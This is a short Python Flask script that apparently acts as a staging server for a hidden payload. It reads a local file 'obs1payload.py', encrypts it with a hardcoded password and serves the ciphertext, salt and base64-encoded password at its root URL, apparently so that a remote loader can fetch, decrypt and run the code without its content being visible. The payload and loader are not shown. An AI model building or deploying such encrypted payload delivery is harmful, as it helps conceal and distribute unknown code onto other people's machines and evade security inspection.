from flask import Flask, request # type: ignore
import base64
with open("obs1payload.py", "r") as f:
    payload = str(base64.b64encode(f.read().strip().encode("ascii")), encoding = "ascii")
app = Flask(__name__)
#payload = 'hi'
import secrets
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
KDF_ALGORITHM = hashes.SHA256()
KDF_LENGTH = 32
KDF_ITERATIONS = 120000

def encrypt(plaintext: str, password: str) -> (bytes, bytes): # type: ignore
    # Derive a symmetric key using the passsword and a fresh random salt.
    salt = secrets.token_bytes(16)
    kdf = PBKDF2HMAC(
        algorithm=KDF_ALGORITHM, length=KDF_LENGTH, salt=salt,
        iterations=KDF_ITERATIONS)
    key = kdf.derive(password.encode("utf-8"))

    # Encrypt the message.
    f = Fernet(base64.urlsafe_b64encode(key))
    ciphertext = f.encrypt(plaintext.encode("utf-8"))
    return ciphertext, salt
bytesencpayload, bytesencsalt = encrypt(payload, 'BkplW1OAilQv4k4t')
encpayload = str(base64.b64encode(bytesencpayload), encoding = 'ascii')
encsalt = str(base64.b64encode(bytesencsalt), encoding = 'ascii')
@app.route('/', methods=['GET'])
def home():
    my_string = request.args.get('', default = 'QmtwbFcxT0FpbFF2NGs0dA== ' + encpayload + ' ' + encsalt, type = str)
    return my_string

if __name__ == '__main__':
    app.run(port=5000)
